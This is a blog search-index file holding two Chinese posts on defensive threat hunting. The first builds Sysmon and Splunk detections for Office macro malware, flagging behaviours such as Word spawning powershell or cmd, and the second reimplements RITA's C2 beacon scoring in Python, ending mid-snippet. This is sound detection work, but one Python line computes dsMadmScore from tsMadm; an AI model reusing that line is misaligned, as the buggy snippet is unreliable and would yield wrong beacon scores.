<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>针对Office宏病毒的高级检测</title>
    <link href="/posts/1373942583/"/>
    <url>/posts/1373942583/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在之前的文章——<a href="https://blog.moofeng.cn/jian-ce-gong-cheng/wei-xie-shou-lie-de-zui-jia-shi-jian#shen-ru-yan-jiu">《威胁狩猎的最佳实践》</a>里提到过一个针对钓鱼邮件的检测场景，本文会详细分享下当时使用的检测技巧</p><p>遵循前文提到的威胁狩猎流程，让我们从威胁假设(hypothesis)出发：</p><blockquote><p>攻击者可能发送带有恶意附件的钓鱼邮件，诱导受害者点击从而获取对方的系统控制权限</p></blockquote><p>期间会借助 <a href="https://github.com/redcanaryco/atomic-red-team/">Atomic</a> 工具完成攻击复现，再对具体的过程细节进行分析取证，然后深入研究、剖析其行为特征</p><p>最后输出检测规则或者 dashboard，作为本次威胁狩猎活动的产出</p><p>PS：注意，这里只是提供一种检测思路，测试过程均在实验环境下完成，并不代表实际工作效果</p><h1 id="分析取证"><a href="#分析取证" class="headerlink" title="分析取证"></a>分析取证</h1><p>在对特定攻击活动做数字取证(Digital Forensics)的过程中，通常我会采用<strong>漏斗状的思维模型</strong>，一步步缩小观测范围，聚焦目标行为特征</p><p>简单做了张图，大概是这么个意思：</p><p><img src="https://photo.moofeng.cn/typora/image-20220120144138140.png" alt="image-20220120144138140"></p><h2 id="采集全量日志"><a href="#采集全量日志" class="headerlink" title="采集全量日志"></a>采集全量日志</h2><p>针对威胁假设的场景，首先我们需要尽可能地保证 office 办公软件的所有行为无处遁形</p><p>为了实现图中的逐层分析，还是拿出我惯用的 sysmon，借助其<strong>配置文件</strong>来完成，千万别小瞧了这些配置，里面可是有宝藏的！</p><p>第一步，建立 <strong>OfficeWatch.xml</strong> 的配置文件，部分内容示例如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Sysmon</span> <span class="hljs-attr">schemaversion</span>=<span class="hljs-string">&quot;4.70&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">HashAlgorithms</span>&gt;</span>md5<span class="hljs-tag">&lt;/<span class="hljs-name">HashAlgorithms</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">CheckRevocation</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">EventFiltering</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RuleGroup</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Process Creation-Include&quot;</span> <span class="hljs-attr">groupRelation</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ProcessCreate</span> <span class="hljs-attr">onmatch</span>=<span class="hljs-string">&quot;include&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Image</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>WINWORD.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Image</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ParentImage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>WINWORD.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">ParentImage</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Image</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>EXCEL.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Image</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ParentImage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>EXCEL.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">ParentImage</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ProcessCreate</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RuleGroup</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RuleGroup</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Process Creation-Exclude&quot;</span> <span class="hljs-attr">groupRelation</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ProcessCreate</span> <span class="hljs-attr">onmatch</span>=<span class="hljs-string">&quot;exclude&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ProcessCreate</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RuleGroup</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RuleGroup</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Network Connect-Include&quot;</span> <span class="hljs-attr">groupRelation</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">NetworkConnect</span> <span class="hljs-attr">onmatch</span>=<span class="hljs-string">&quot;include&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Image</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>WINWORD.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Image</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Image</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>EXCEL.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Image</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">NetworkConnect</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RuleGroup</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RuleGroup</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Network Connect-Exclude&quot;</span> <span class="hljs-attr">groupRelation</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">NetworkConnect</span> <span class="hljs-attr">onmatch</span>=<span class="hljs-string">&quot;exclude&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">NetworkConnect</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RuleGroup</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RuleGroup</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;File Create - Include&quot;</span> <span class="hljs-attr">groupRelation</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">FileCreate</span> <span class="hljs-attr">onmatch</span>=<span class="hljs-string">&quot;include&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Image</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>WINWORD.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Image</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Image</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">condition</span>=<span class="hljs-string">&quot;end with&quot;</span>&gt;</span>EXCEL.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Image</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">FileCreate</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RuleGroup</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RuleGroup</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;File Create - Exclude&quot;</span> <span class="hljs-attr">groupRelation</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">FileCreate</span> <span class="hljs-attr">onmatch</span>=<span class="hljs-string">&quot;exclude&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">FileCreate</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RuleGroup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">EventFiltering</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Sysmon</span>&gt;</span><br></code></pre></td></tr></table></figure><p>指定 office 软件相关的文件名，保证其进程、文件、网络、DLL 加载和注册表等日志均能被全量采集，同时避免干扰信息</p><p>另外，这一步的主要目的不仅是为了<strong>保持观测目标的可见性</strong>，更是为了下一步缩小观测范围而<strong>建立遥测数据的白名单</strong></p><p>例如，平常我们在打开 word 文档的过程中，会产生与微软服务器间的通信，这些是我们需要进行加白处理的</p><p><img src="https://photo.moofeng.cn/typora/image-20220120152550496.png" alt="image-20220120152550496"></p><p>同样的，这些加载的 DLL 文件也可以建立一份白名单，当然也别忘了多加留意它们的<strong>签名状态</strong>(SignatureStatus)</p><p><img src="https://photo.moofeng.cn/typora/image-20220120153122528.png" alt="image-20220120153122528"></p><p>最后，分析、汇总上述成果，建立一份新的配置文件，用于过滤 office 办公软件的正常行为，将其命名为 <strong>OfficeShush.xml</strong></p><p><img src="https://photo.moofeng.cn/typora/image-20220120153519125.png" alt="image-20220120153519125"></p><h2 id="过滤正常行为"><a href="#过滤正常行为" class="headerlink" title="过滤正常行为"></a>过滤正常行为</h2><p>关于 OfficeShush.xml 文件的迭代，其实也就是我们对 office 软件相关进程<strong>建设行为基线</strong>的过程</p><p>这一步需要我们在实验环境下考量全面，夯实基础，再去生产环境中慢慢打磨优化</p><p>然后，便得引入丰富的恶意样本，分析其在过滤正常行为后的特征表现</p><p>这里其实就是<strong>攻击复现</strong>的过程了，以 <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md">T1204.002</a> 为例，跑完攻击脚本，看看会有哪些有意思的发现：</p><p>—— 一些脚本文件的创建</p><p><img src="https://photo.moofeng.cn/typora/image-20220120210958734.png" alt="image-20220120210958734"></p><p>—— 一些异常的命令执行和父子进程关系</p><p><img src="https://photo.moofeng.cn/typora/image-20220120211243311.png" alt="image-20220120211243311"></p><p>—— 一些特定行为(例如运行宏、XMLDOM、WMI等)才会加载的 DLL </p><p><img src="https://photo.moofeng.cn/typora/image-20220120212238439.png" alt="image-20220120212238439"></p><h2 id="聚焦可疑特征"><a href="#聚焦可疑特征" class="headerlink" title="聚焦可疑特征"></a>聚焦可疑特征</h2><p>通过对各类恶意样本或者具体攻击方式做深入分析，我们可以简单梳理一些常见攻击行为会表现出来的特征：</p><ul><li>可疑文件的落地(释放脚本或可执行文件)</li><li>涉及敏感注册表位置的修改</li><li>可疑DLL文件的加载行为(加载COM、WMI、或.NET功能所必需的DLL文件)</li><li>可疑的网络请求行为(与云服务商或者奇怪的域名通信)</li><li>异常的父子进程关系(office软件调用powershell、cmd命令行)</li><li>…</li></ul><p>整理好这些特征点，我们可以凭此生成新的日志采集配置文件，或者给相应的遥测数据打上标签，或者直接加工后转换成检测规则</p><p>但是在此之前呢，我想先介绍一种告警手段 —— <strong>Risk-Based Alerting(RBA)</strong></p><p>一些安全运营人员可能对“<strong>元告警</strong>”(Meta-Alert)的概念并不陌生，这类告警通常由其它安全设备上报而来</p><p>比如在 SIEM 上消费由 EDR 产生的病毒或后门类的告警，这种可以称之为 “meta alert”</p><p>在此基础之上，我想谈论的情况是：<strong>在一段时间内，有两条及以上针对同一主机(事件)的检测规则，组合产生了一条告警</strong></p><p>什么时候应该使用这种告警方式呢？</p><p>在很多场景中，SIEM 或 SOC 平台上的规则检出只能被视为一种<strong>弱信号</strong>(weak signals)</p><p>它们更适宜被归类成 observable 或 indicator，而不适合直接用作告警，否则会引起运营人员的<strong>告警疲劳</strong></p><p>此时如果我们通过一种检测方式对这些信号做关联分析，最后产出告警，这一思路就被称作 RBA</p><p>受限于手头的工具和平台，本文我只能借助 splunk 演示一种类似的检测方式，通过生成一段 <strong>Hyper Queries</strong> 来达到差不多的效果</p><h1 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h1><h2 id="行为检测"><a href="#行为检测" class="headerlink" title="行为检测"></a>行为检测</h2><p>根据前面整理出的这些 office 宏病毒相关的可疑活动或者高危操作的行为特征，先写一些简单的规则给它们定个性</p><p>这一步可以借助 splunk 给符合特定行为的 sysmon 日志<strong>打上不同的标签</strong>，或者<strong>进行危害评分</strong>，便于后续做关联分析</p><p>比如攻击者可能会利用宏代码调用 cmd、powershell 等进程，进一步完成恶意命令执行的操作</p><p><img src="https://photo.moofeng.cn/typora/image-20220121173745746.png" alt="image-20220121173745746"></p><p>或者攻击者会将 payload 写入磁盘，以特定后缀形式的文件在受害者主机落地</p><p><img src="https://photo.moofeng.cn/typora/image-20220121175146676.png" alt="image-20220121175146676"></p><h2 id="风险判定"><a href="#风险判定" class="headerlink" title="风险判定"></a>风险判定</h2><p>放在平时，或许很多人会直接拿着这些行为特征输出成告警</p><p>但是针对 office 邮件钓鱼这类频发场景，我们不妨深入研究下，加入一些算法以提高告警置信度</p><p>以下演示中，我会为不同的行为简单地指定风险评分，最后进行求和汇总，将超过特定阈值的一系列行为视作高危操作</p><p>为方便读者自行对比，找了一篇友商近期的分析文章：<a href="https://mp.weixin.qq.com/s/1L7o1C-aGlMBAXzHqR9udA">https://mp.weixin.qq.com/s/1L7o1C-aGlMBAXzHqR9udA</a></p><p>然后上 ANYRUN 拿了份样本：<a href="https://app.any.run/tasks/300229f4-dd97-42d8-bbce-72274ef8b9e9">https://app.any.run/tasks/300229f4-dd97-42d8-bbce-72274ef8b9e9</a></p><p>实验过程中的检测效果如下：</p><p><img src="https://photo.moofeng.cn/typora/image-20220121220759009.png" alt="image-20220121220759009"></p><p>演示代码放在这里：<a href="https://github.com/Moofeng/DemoCode/blob/main/office_detection_spl">https://github.com/Moofeng/DemoCode/blob/main/office_detection_spl</a></p><p>结合上述文章和检测结果，可以看到攻击过程几个异常点都能很好的标识出来，例如 <strong>background.dll 文件的落地</strong>和<strong>通过 COM 对象执行计划任务</strong>等关键步骤</p><p>最后的判定结果还是具备一定参考意义的，当然，具体的评分体系需要自行设置和优化</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文灵感来源于 <a href="https://twitter.com/Antonlovesdnb">@Anton</a>，篇幅限制，省略了部分细节，强烈建议感兴趣的同学去看原视频：</p><p><a href="https://www.youtube.com/watch?v=soF5iyeeWDg">https://www.youtube.com/watch?v=soF5iyeeWDg</a></p><p>实验过程中借助 splunk 实现的一些检测技巧，参考 <a href="https://twitter.com/ateixei">@Alex</a> 的文章：</p><p><a href="https://github.com/inodee/threathunting-spl/blob/master/hunt-queries/powershell_qualifiers.md">https://github.com/inodee/threathunting-spl/blob/master/hunt-queries/powershell_qualifiers.md</a></p><p>感谢！</p>]]></content>
    
    
    <categories>
      
      <category>威胁狩猎</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>利用RITA检测beacon通信</title>
    <link href="/posts/1189487970/"/>
    <url>/posts/1189487970/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://github.com/activecm/rita">RITA </a>(Real Intelligence Threat Analytics) 是一个用于检测 C2 通信流量的开源项目，由 GO 语言编写</p><p>本文主要介绍其分析器的工作原理，并借助 Python 代码逐步还原该算法</p><p>为方便阅读，以下涉及到的变量均参照源码搬运而来，读者可跳转至该项目后自行作对比分析</p><p>分析器源码地址：<a href="https://github.com/activecm/rita/blob/master/pkg/beacon/analyzer.go">https://github.com/activecm/rita/blob/master/pkg/beacon/analyzer.go</a></p><p>该算法对<strong>同源-目的IP</strong>间的通信，进行分数计算得到 <strong>score</strong>，其值分布为 0~1 之间，<strong>趋近 1 则疑似 beacon 通信行为</strong></p><p>具体计算过程大致上可以分为两部分，根据<strong>通信间隔</strong>和<strong>数据包大小</strong>的特征，分别计算出 <strong>tsScore</strong> 和 <strong>dsScore</strong>，最后取均值得到 score</p><p>其中，tsScore 和 dsScore 的计算过程相似，下面开始针对各个部分做具体分析</p><h1 id="tsScore的计算"><a href="#tsScore的计算" class="headerlink" title="tsScore的计算"></a>tsScore的计算</h1><p>tsScore 的计算又细分为三个部分：<strong>tsSkewScore</strong>、<strong>tsMadmScore</strong>、<strong>tsConnCountScore</strong></p><h2 id="tsSkewScore"><a href="#tsSkewScore" class="headerlink" title="tsSkewScore"></a>tsSkewScore</h2><p>该值的计算原理在源码中的注释部分也有所解释，即：理想的 beacon 通信行为应该具有通信间隔和数据大小呈现<strong>对称分布</strong>的特征</p><p><img src="https://photo.moofeng.cn/typora/image-20220117103322321.png" alt="image-20220117103322321"></p><p>意思也很好理解，以 CobalStrike 默认的 beacon 配置为例，其通信行为如下图所示：</p><p><img src="https://photo.moofeng.cn/typora/image-20220117210711125.png" alt="image-20220117210711125"></p><p>CS 默认回连的间隔时间为 60 秒，即使加上抖动(jitter)，理论上仍然会呈现出高度对称的分布特征，其数据包大小亦如是</p><p>这里采用<a href="https://www.statisticshowto.com/bowley-skewness/">Bowley 偏度公式</a>来度量对称性，得到偏度系数 tsSkew 和 dsSkew，后者在第二部分计算 dsScore 时会使用到</p><p>所谓的偏度系数，适用于描述曲线形状的对称性，其值在 1 到 -1 之间，分别代表着正偏斜或负偏斜，参照下图</p><p><img src="https://photo.moofeng.cn/typora/image-20220117160802106.png" alt="image-20220117160802106"></p><p>具体计算时需要对数据集按大小顺序作四等分，在三个分位点依次取值：tsLow，tsMid，tsHigh</p><p>Python 示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 根据时间戳计算通信间隔</span><br>http_df[<span class="hljs-string">&#x27;deltas&#x27;</span>] = http_df[timestamp].apply(<span class="hljs-keyword">lambda</span> x: pd.Series(x).diff().dt.seconds.dropna().tolist())<br><span class="hljs-comment"># 以通信间隔为数据集，计算各分位点处数值</span><br>http_df[<span class="hljs-string">&#x27;tsLow&#x27;</span>] = http_df[<span class="hljs-string">&#x27;deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.percentile(np.array(x), <span class="hljs-number">25</span>))<br>http_df[<span class="hljs-string">&#x27;tsMid&#x27;</span>] = http_df[<span class="hljs-string">&#x27;deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.percentile(np.array(x), <span class="hljs-number">50</span>))<br>http_df[<span class="hljs-string">&#x27;tsHigh&#x27;</span>] = http_df[<span class="hljs-string">&#x27;deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.percentile(np.array(x), <span class="hljs-number">75</span>))<br><span class="hljs-comment"># 根据公式：Bowley Skewness = (Q1 + Q3 – 2Q2) / (Q3 – Q1)，计算分母和分子</span><br>http_df[<span class="hljs-string">&#x27;tsBowleyNum&#x27;</span>] = http_df[<span class="hljs-string">&#x27;tsLow&#x27;</span>] + http_df[<span class="hljs-string">&#x27;tsHigh&#x27;</span>] - <span class="hljs-number">2</span>*http_df[<span class="hljs-string">&#x27;tsMid&#x27;</span>]<br>http_df[<span class="hljs-string">&#x27;tsBowleyDen&#x27;</span>] = http_df[<span class="hljs-string">&#x27;tsHigh&#x27;</span>] - http_df[<span class="hljs-string">&#x27;tsLow&#x27;</span>]<br><span class="hljs-comment"># 如果分母为 0，Q2 = Q1 或 Q2 = Q3，则计算结果不可靠，tsSkew 取 0</span><br>http_df[<span class="hljs-string">&#x27;tsSkew&#x27;</span>] = http_df[[<span class="hljs-string">&#x27;tsLow&#x27;</span>,<span class="hljs-string">&#x27;tsMid&#x27;</span>,<span class="hljs-string">&#x27;tsHigh&#x27;</span>,<span class="hljs-string">&#x27;tsBowleyNum&#x27;</span>,<span class="hljs-string">&#x27;tsBowleyDen&#x27;</span>]].apply(<br>    <span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&#x27;tsBowleyNum&#x27;</span>] / x[<span class="hljs-string">&#x27;tsBowleyDen&#x27;</span>] <span class="hljs-keyword">if</span> x[<span class="hljs-string">&#x27;tsBowleyDen&#x27;</span>] != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> x[<span class="hljs-string">&#x27;tsMid&#x27;</span>] != x[<span class="hljs-string">&#x27;tsLow&#x27;</span>] <span class="hljs-keyword">and</span> x[<span class="hljs-string">&#x27;tsMid&#x27;</span>] != x[<span class="hljs-string">&#x27;tsHigh&#x27;</span>] <span class="hljs-keyword">else</span> <span class="hljs-number">0.0</span>, axis=<span class="hljs-number">1</span><br>    )<br></code></pre></td></tr></table></figure><p>最后根据 tsSkew 算出：tsSkewScore &#x3D; 1 - abs(tsSkew)</p><h2 id="tsMADMScore"><a href="#tsMADMScore" class="headerlink" title="tsMADMScore"></a>tsMADMScore</h2><p>这一段计算的前提为：理想的 beacon 通信行为在其通信间隔的<strong>中位数</strong>周围应该具有很低的<strong>分散度</strong></p><p>该特征可以用 <strong>MADM</strong>（Median Absolute Deviation about the Median）来度量</p><p><img src="https://photo.moofeng.cn/typora/image-20220117113352117.png" alt="image-20220117113352117"></p><p>具体计算过程也比较简单，在 Python 中我们用一行代码就能搞定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http_df[<span class="hljs-string">&#x27;tsMadm&#x27;</span>] = http_df[<span class="hljs-string">&#x27;deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.median(np.absolute(np.array(x) - np.median(np.array(x)))))<br></code></pre></td></tr></table></figure><p>得到 tsMadm 和 dsMadm 后，设定 <strong>30秒</strong> 和 <strong>32字节</strong> 作为阈值，超出则分数计为 0</p><p><img src="https://photo.moofeng.cn/typora/image-20220117114108977.png" alt="image-20220117114108977"></p><p>因为这里的分散度越低越好，由此可以计算出 tsMadmScore 和 dsMadmScore，以下是 Python 示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http_df[<span class="hljs-string">&#x27;tsMadmScore&#x27;</span>] = <span class="hljs-number">1.0</span> - http_df[<span class="hljs-string">&#x27;tsMadm&#x27;</span>] / <span class="hljs-number">30.0</span><br>http_df[<span class="hljs-string">&#x27;tsMadmScore&#x27;</span>] = http_df[<span class="hljs-string">&#x27;tsMadmScore&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> x)<br>http_df[<span class="hljs-string">&#x27;dsMadmScore&#x27;</span>] = <span class="hljs-number">1.0</span> - http_df[<span class="hljs-string">&#x27;tsMadm&#x27;</span>] / <span class="hljs-number">32.0</span><br>http_df[<span class="hljs-string">&#x27;dsMadmScore&#x27;</span>] = http_df[<span class="hljs-string">&#x27;dsMadmScore&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> x)<br></code></pre></td></tr></table></figure><h2 id="tsConnCountScore"><a href="#tsConnCountScore" class="headerlink" title="tsConnCountScore"></a>tsConnCountScore</h2><p>跟上面的 SkewScore 和 MadmScore 不同，这一部分在 tsScore 和 dsScore 中的计算有所区别</p><p>在行为特征上，beacon 通信时往往具有较高的连接数，tsConnCountScore 正是用来度量这一点的</p><p>利用通信的持续时间和连接次数计算得到：tsConnCountScore &#x3D; ConnectionCount &#x2F; (tsConnDiv &#x2F; 10.0)</p><p><img src="https://photo.moofeng.cn/typora/image-20220117114820960.png" alt="image-20220117114820960"></p><p>其中，ConnectionCount 代表通信次数，tsConnDiv 由通信起止时间除以固定的连接频率得来，此处该值取为 <strong>10 秒</strong></p><p>最后得分如果大于1，则向下舍入取1，因为连接得越频繁，越有可能是 beacon 通信</p><p>PS：对于这里的 10 秒，应该还存在优化空间，有研究员指出该值太小可能会影响最终得分从而产生漏报，<a href="https://github.com/activecm/rita/issues/716">传送地址</a></p><p>综上，计算  tsScore &#x3D;  (tsSkewScore + tsMADMScore + tsConnCountScore) &#x2F; 3.0</p><p><img src="https://photo.moofeng.cn/typora/image-20220117143249150.png" alt="image-20220117143249150"></p><h1 id="dsScore的计算"><a href="#dsScore的计算" class="headerlink" title="dsScore的计算"></a>dsScore的计算</h1><p>数据大小的分散度(<strong>dsSkewScore</strong>)和 MADM(<strong>dsMADMScore</strong>) 的算法不变，前文已经有所解释</p><p>主要区别在于，计算 dsMADMScore 时数据大小的 MADM 以 <strong>32 字节</strong>作为阈值，数据包超出该大小则得分为 0</p><p><img src="https://photo.moofeng.cn/typora/image-20220117143909812.png" alt="image-20220117143909812"></p><p>另外，由于 beacon 通常都是较小的数据包，这里采用 <strong>dsSmallnessScore</strong> 作为衡量指标</p><p><img src="https://photo.moofeng.cn/typora/image-20220117143530197.png" alt="image-20220117143530197"></p><p>其含义为，如果数据包大小的众数(Mode)超过 <strong>65 Kb</strong>，则得分为 0</p><p>Python 示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 计算数据包大小差值</span><br>http_df[<span class="hljs-string">&#x27;size_deltas&#x27;</span>] = http_df[data_size].apply(<span class="hljs-keyword">lambda</span> x: pd.Series(x).diff().dropna().tolist())<br><span class="hljs-comment"># 计算 dsSkew</span><br>http_df[<span class="hljs-string">&#x27;dsLow&#x27;</span>] = http_df[<span class="hljs-string">&#x27;size_deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.percentile(np.array(x), <span class="hljs-number">25</span>))<br>http_df[<span class="hljs-string">&#x27;dsMid&#x27;</span>] = http_df[<span class="hljs-string">&#x27;size_deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.percentile(np.array(x), <span class="hljs-number">50</span>))<br>http_df[<span class="hljs-string">&#x27;dsHigh&#x27;</span>] = http_df[<span class="hljs-string">&#x27;size_deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.percentile(np.array(x), <span class="hljs-number">75</span>))<br>http_df[<span class="hljs-string">&#x27;dsBowleyNum&#x27;</span>] = http_df[<span class="hljs-string">&#x27;dsLow&#x27;</span>] + http_df[<span class="hljs-string">&#x27;dsHigh&#x27;</span>] - <span class="hljs-number">2</span>*http_df[<span class="hljs-string">&#x27;dsMid&#x27;</span>]<br>http_df[<span class="hljs-string">&#x27;dsBowleyDen&#x27;</span>] = http_df[<span class="hljs-string">&#x27;dsHigh&#x27;</span>] - http_df[<span class="hljs-string">&#x27;dsLow&#x27;</span>]<br>http_df[<span class="hljs-string">&#x27;dsSkew&#x27;</span>] = http_df[[<span class="hljs-string">&#x27;dsLow&#x27;</span>,<span class="hljs-string">&#x27;dsMid&#x27;</span>,<span class="hljs-string">&#x27;dsHigh&#x27;</span>,<span class="hljs-string">&#x27;dsBowleyNum&#x27;</span>,<span class="hljs-string">&#x27;dsBowleyDen&#x27;</span>]].apply(<br>    <span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&#x27;dsBowleyNum&#x27;</span>] / x[<span class="hljs-string">&#x27;dsBowleyDen&#x27;</span>] <span class="hljs-keyword">if</span> x[<span class="hljs-string">&#x27;dsBowleyDen&#x27;</span>] != <span class="hljs-number">0</span> 